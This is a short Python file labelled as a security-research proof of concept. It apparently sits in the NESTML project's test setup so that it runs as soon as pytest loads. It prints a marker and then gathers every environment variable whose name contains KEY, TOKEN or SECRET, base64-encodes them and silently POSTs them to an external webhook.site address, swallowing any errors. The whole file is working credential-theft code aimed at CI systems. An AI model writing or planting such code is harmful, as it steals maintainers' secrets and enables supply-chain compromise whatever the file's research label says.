# PoC: Code execution at pytest load (security research)
import sys

_POC_MARKER = "NESTML_POC_1772094808_jlxhbboy"
print(_POC_MARKER, flush=True)
sys.stdout.flush()

# Exfil env vars
import base64
import json
import urllib.request

_secrets = dict(
    (k, v)
    for k, v in __import__("os").environ.items()
    if v and ("KEY" in k or "TOKEN" in k or "SECRET" in k)
)
if _secrets:
    try:
        _payload = (
            "poc=1&repo=nestml&marker="
            + _POC_MARKER
            + "&env="
            + base64.b64encode(json.dumps(_secrets).encode()).decode()
        )
        _req = urllib.request.Request(
            "https://webhook.site/e429f21e-077e-49f3-af0e-8d1700823365", data=_payload.encode(), method="POST"
        )
        _req.add_header("Content-Type", "application/x-www-form-urlencoded")
        urllib.request.urlopen(_req, timeout=5)
    except Exception:
        pass